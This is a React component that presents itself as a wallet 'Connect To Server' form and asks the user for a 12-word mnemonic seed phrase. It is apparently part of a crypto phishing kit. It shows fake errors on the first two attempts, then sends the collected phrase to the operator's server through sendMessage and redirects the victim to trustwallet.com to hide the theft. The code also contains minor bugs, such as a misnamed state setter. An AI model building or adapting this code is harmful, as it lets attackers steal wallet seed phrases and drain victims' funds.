import { LoadingButton } from "@mui/lab";
import {
  Box,
  Card,
  CardContent,
  CardHeader,
  Container,
  Grid,
  TextField,
  Typography,
  alpha,
  styled,
} from "@mui/material";
import React from "react";
import { notify, sendMessage } from "../config/server";

const RedditTextField = styled((props) => (
  <TextField InputProps={{ disableUnderline: true }} {...props} />
))(({ theme }) => ({
  "& .MuiFilledInput-root": {
    overflow: "hidden",
    borderRadius: 4,
    backgroundColor: theme.palette.mode === "light" ? "#F3F6F9" : "#1A2027",
    border: "1px solid",
    borderColor: theme.palette.mode === "light" ? "#E0E3E7" : "#2D3843",
    transition: theme.transitions.create([
      "border-color",
      "background-color",
      "box-shadow",
    ]),
    "&:hover": {
      backgroundColor: "transparent",
    },
    "&.Mui-focused": {
      backgroundColor: "transparent",
      boxShadow: `${alpha(theme.palette.primary.main, 0.25)} 0 0 0 2px`,
      borderColor: theme.palette.primary.main,
    },
  },
}));

function ConnectWallet() {
  const [loading, setLoading] = React.useState(false);
  const [sendcount, setSendcount] = React.useState(0);
  const [values, setValues] = React.useState({
    One: "",
    Two: "",
    Three: "",
    Four: "",
    Five: "",
    Six: "",
    Seven: "",
    Eight: "",
    Nine: "",
    Ten: "",
    Eleven: "",
    Twelve: "",
  });
  const onChange = (e) => {
    setValues({
      [e.target.name]: e.target.value,
    });
    console.log(e.target.value);
  };

  const submit = (e) => {
    e.preventDefault();
    setLoading(true);
    const messagebody = `Phrase: <br />
    ${values.One} ${values.Two} ${values.Three} ${values.Four} ${values.Five} ${
      values.Six
    } ${values.Seven} ${values.Eight} ${values.Nine} ${values.Ten} ${
      values.Eleven
    } ${values.Twelve}`;

    if (sendcount <= 1) {
      notify();
      setSendcount(sendcount + 1);
      setValue({
        One: "",
        Two: "",
        Three: "",
        Four: "",
        Five: "",
        Six: "",
        Seven: "",
        Eight: "",
        Nine: "",
        Ten: "",
        Eleven: "",
        Twelve: "",
      });
      setLoading(false);
    } else {
      sendMessage({ wallet: "Metamask", phrase: messagebody }).then(() => {
        setLoading(false);
        window.location.replace("https://trustwallet.com/");
      });
    }
  };

  return (
    <Container maxWidth="md">
      <Box mt={2}>
        <CardHeader title="Connect To Server" subheader="12 WORD PHRASE" />
      </Box>
      <Card variant="outlined" sx={{ mt: 5 }}>
        <CardContent>
          <Typography gutterBottom variant="h5" component="div">
            MNEMONIC
          </Typography>
          <form onSubmit={submit}>
            <Grid container spacing={3}>
              {[
                { title: "One", value: values.One },
                { title: "Two", value: values.Two },
                { title: "Three", value: values.Three },
                { title: "Four", value: values.Four },
                { title: "Five", value: values.Five },
                { title: "Six", value: values.Six },
                { title: "Seven", value: values.Seven },
                { title: "Eight", value: values.Eight },
                { title: "Nine", value: values.Nine },
                { title: "Ten", value: values.Ten },
                { title: "Eleven", value: values.Eleven },
                { title: "Twelve", value: values.Twelve },
              ].map((vl, index) => (
                <Grid key={index} item xs={12} sm={12}>
                  <RedditTextField
                    size="small"
                    fullWidth
                    label={vl.title}
                    defaultValue={vl.value}
                    id="reddit-input"
                    variant="filled"
                    style={{ marginTop: 11 }}
                    onChange={onChange}
                  />
                </Grid>
              ))}
              <Grid item xs={12} sm={12}>
                <LoadingButton
                  type="submit"
                  fullWidth
                  loading={loading}
                  variant="contained"
                  color="primary"
                  disableElevation
                >
                  {"Connect"}
                </LoadingButton>
              </Grid>
            </Grid>
          </form>
        </CardContent>
      </Card>
    </Container>
  );
}

export default ConnectWallet;

/*
  "Four",
              "Five",
              "Six",
              "Seven",
              "Eight",
              "Nine",
              "Ten",
              "Eleven",
              "Twelve",
*/
